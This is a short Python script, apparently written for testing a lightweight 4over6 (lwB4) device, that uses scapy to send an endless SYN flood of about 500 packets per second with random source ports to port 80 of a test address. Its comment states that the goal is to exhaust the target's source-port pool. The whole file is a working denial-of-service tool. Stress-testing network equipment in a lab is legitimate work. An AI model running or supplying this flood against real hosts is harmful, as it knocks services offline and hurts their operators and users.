#!/usr/bin/env python3


# This script sends 500 TCP SYN packets per second and floods the lwB4 machine and exhausts its pool of source ports.

from scapy.all import *
import time

target_ip = "192.0.2.2"
target_port = 80


ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
pp = ip / tcp / raw

packets_per_second = 500

# Send packets in a loop with sleep time to control the rate
while True:
    send(pp, verbose=0)
    time.sleep(1/packets_per_second)
